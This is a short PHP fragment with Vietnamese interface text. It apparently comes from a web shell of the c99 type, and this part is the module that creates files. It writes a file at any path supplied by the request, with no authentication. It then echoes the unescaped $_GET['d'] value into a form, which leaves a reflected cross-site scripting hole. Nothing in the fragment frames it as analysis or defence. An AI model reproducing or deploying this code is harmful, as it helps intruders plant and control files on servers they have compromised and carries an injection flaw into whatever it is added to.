<?php


 if ($mkfile != $d)
 {
  if (file_exists($mkfile)) {echo "<b>Tạo file \"".htmlspecialchars($mkfile)."\"</b>: đã tồn tại";}
  elseif (!fopen($mkfile,"w")) {echo "<b>Tạo file \"".htmlspecialchars($mkfile)."\"</b>: bị chặn";}
  else {$act = "f"; $d = dirname($mkfile); if (substr($d,-1,1) != DIRECTORY_SEPARATOR)
  {$d .= DIRECTORY_SEPARATOR;} $f = basename($mkfile); echo noidung('Tạo thành công!');}
 }
 else {$act = $dspact = "ls";}
 
echo '<center><b>:: Tạo file ::</b><form method="POST">
<input type="hidden" name="act" value="mkfile">
<input type="hidden" name="d" value="'.$_GET['d'].'">
<input type="text" name="mkfile" size="50" value="'.$_GET['d'].'">
<input type="hidden" name="ft" value="edit">&nbsp;
<input type="submit" value="Tạo"></form></center>';
